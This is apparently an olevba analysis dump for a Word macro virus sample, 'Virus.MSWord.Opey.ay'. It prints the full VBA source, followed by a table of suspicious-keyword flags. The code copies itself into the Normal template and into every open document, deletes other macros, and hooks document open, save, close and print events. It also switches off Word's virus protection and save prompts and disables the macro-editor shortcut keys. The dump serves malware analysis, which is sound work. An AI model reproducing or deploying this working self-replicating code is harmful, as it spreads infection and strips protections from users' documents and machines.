olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.ay
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.ay - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Supils.bas 
in file: Virus.MSWord.Opey.ay - OLE stream: 'Macros/VBA/Supils'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Supil()
On Error Resume Next
WordBasic.DisableAutoMacros -1
tNormal = False
    For I = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
        nme = NormalTemplate.VBProject.VBComponents(I).Name
        If nme = "Supils" Then tNormal = True
        If (nme <> "Supils") And _
            (nme <> "ThisDocument") Then
            Application.OrganizerDelete _
                Source:=NormalTemplate.FullName _
                , Name:=nme _
                , Object:=wdOrganizerObjectProjectItems
                End If
            If (nme) = "ThisDocument" And (NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines <> 0) Then
            End If
           Next I
cnt = activedoc.VBProject.VBComponents.Count



For Each activedoc In Documents
        currentdoc = False
        With activedoc
            For i2 = activedoc.VBProject.VBComponents.Count To 1 Step -1
                nme = activedoc.VBProject.VBComponents(i2).Name
                If nme = "Supils" Then currentdoc = True
                If (nme <> "Supils") And _
                   (nme <> "ThisDocument") And _
                   (nme <> "Reference to Normal") Then
                   res = MsgBox("A Macro program (" + nme + ") is found on this file that can be harmful to your computer..!           Did you create this?    it's 'me' (the Supils) ", vbYesNo)
                   If res = 7 Then
                     Application.OrganizerDelete Source:=activedoc.FullName _
                     , Name:=nme _
                     , Object:=wdOrganizerObjectProjectItems
                     End If
                End If
                If (nme = "ThisDocument") And (activedoc.VBProject.VBComponents(1).CodeModule.CountOfLines <> 0) Then
            For nolines = activedoc.VBProject.VBComponents(i2).CodeModule.CountOfLines To 1 Step -1
            activedoc.VBProject.VBComponents(i2).CodeModule.DeleteLines (nolines)
            Next nolines
            activedoc.VBProject.VBComponents(i2).CodeModule.DeleteLines (nolines)
            End If
            Next i2
            
            If Not currentdoc Then
           Application.OrganizerCopy Source:=NormalTemplate.FullName, _
                Destination:=activedoc.FullName, _
                Name:="Supils", _
                Object:=wdOrganizerObjectProjectItems
                activedoc.SaveAs FileName:=activedoc.FullName
           End If
        End With
    Next activedoc
    
    If Not tNormal Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
         Destination:=NormalTemplate.FullName, Name:="Supils", _
         Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If

Application.UserName = "Supils"
    Application.UserAddress = " "
    Application.UserInitials = "me"
ActiveDocument.Save

End Sub
Sub FileSave()
    On Error Resume Next
    Call Supil
    ActiveDocument.Save
End Sub

Sub FileClose()
    On Error Resume Next
    Call Supil
    If ActiveDocument.Words(1) <> "" And ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call Supil
    If ActiveDocument.Words(1) <> "" And ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    Call Supil
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call Supil
    ActiveDocument.Save
End Sub
Sub AutoExec()
    On Error Resume Next
    Call Supil
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call Supil
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call Supil
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call Supil
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call Supil
    End Sub
Sub AutoClose()
    On Error Resume Next
    Call Supil
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Supil
    Application.Quit
End Sub




Sub Immunize()
On Error Resume Next
    
    Dim DocuName$, OpenDocImmunized As Boolean
    Dim I%, J%, NmImmunized As Boolean
    
    NmImmunized = False
        
    For I = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
        DocuName = NormalTemplate.VBProject.VBComponents(I).Name
        If DocuName = "AntiVirus_1_0" Then NmImmunized = True
        If (DocuName <> "AntiVirus_1_0") And _
            (DocuName <> "ThisDocument") Then
            Application.OrganizerDelete _
                Source:=NormalTemplate.FullName _
                , Name:=DocuName _
                , Object:=wdOrganizerObjectProjectItems
        End If
    Next I
    
    For Each opendoc In Documents
        OpenDocImmunized = False
        With opendoc
            For J = opendoc.VBProject.VBComponents.Count To 1 Step -1
                DocuName = opendoc.VBProject.VBComponents(J).Name
                If DocuName = "AntiVirus_1_0" Then OpenDocImmunized = True
                If (DocuName <> "AntiVirus_1_0") And _
                   (DocuName <> "ThisDocument") And _
                   (DocuName <> "Reference to Normal") Then
                     Application.OrganizerDelete Source:=opendoc.FullName _
                     , Name:=DocuName _
                     , Object:=wdOrganizerObjectProjectItems
                End If
            Next J
            
            If Not OpenDocImmunized Then
                Application.OrganizerCopy Source:=NormalTemplate.FullName, _
                Destination:=opendoc.FullName, _
                Name:="AntiVirus_1_0", _
                Object:=wdOrganizerObjectProjectItems
                opendoc.SaveAs FileName:=opendoc.FullName
            End If
        End With
    Next opendoc
    
    If Not NmImmunized Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
         Destination:=NormalTemplate.FullName, Name:="AntiVirus_1_0", _
         Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If
    
End Sub
Sub Initialize()
On Error Resume Next
   
   Application.DisplayAlerts = wdAlertsAll
   WordBasic.DisableAutoMacros -1
   
    With Application
        .UserName = "Ulysses R. Gotera"
        .UserAddress = "FoxChit SOFTWARE SOLUTIONS"
        .UserInitials = "URG"
    End With
    
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "Ulysses R. Gotera"
        .Keywords = "FoxChit SOFTWARE SOLUTIONS"
        .Execute
    End With
    
    With Options
        .ConfirmConversions = True
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    
   With CommandBars("Visual Basic")
      .Enabled = True
      .Protection = msoBarTypeMenuBar
      .Protection = msoBarMenuBar
   End With
   
   With CommandBars("Tools")
      .reset
      .Controls("Macro").reset
      .Controls("Customize...").reset
   End With
   
   FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Clear
   FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Clear
   CustomizationContext = NormalTemplate

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

